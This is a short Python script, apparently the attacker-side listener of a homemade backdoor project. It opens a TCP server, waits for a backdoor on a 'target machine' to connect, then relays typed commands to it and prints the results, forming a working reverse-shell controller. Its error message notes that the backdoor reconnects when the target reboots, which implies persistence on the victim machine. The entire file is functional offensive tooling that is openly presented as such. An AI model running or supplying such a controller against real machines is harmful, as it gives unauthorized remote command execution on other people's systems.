import socket
from config import *
from socket_with_buffer import Socket


def main():
    # attacker will be the server in TCP
    # create server socket that listens for incoming connection requests
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_listening_socket:
        server_listening_socket.bind(('', PORT_NUMBER))
        server_listening_socket.listen()

        # once connection is made, activate the remote shell
        conn, address = server_listening_socket.accept()
        with conn:
            print('connection received from', address)
            print('starting remote shell')

            client_socket = Socket(conn) # keep same socket alive for every command we send

            # simulate remote shell
            while True:
                # wait for the backdoor to send the shell prompt
                prompt = client_socket.receive()
                print(prompt, end=' ')

                # get user command and send to target machine
                user_input = input()
                client_socket.send(user_input)

                # wait for backdoor to send command output
                command_output = client_socket.receive()
                command_output = command_output.replace(user_input, '', 1) # user input is included in the command output, get rid of it so doesn't repeat twice in attacker perspective
                print(command_output)


                # user_input = input('Target Machine Shell> ') # ask user to input a command
                # client_socket.send(user_input) # send our command
                # command_output = client_socket.receive() # get output from our command
                # print(command_output)
                # print()

if __name__ == '__main__':
    try:
        main()
    except:
        print('Some error has occured which has broken the socket connection between the target and attack machine.')
        print('To regain access, the target machine must reboot to run the backdoor script again.')
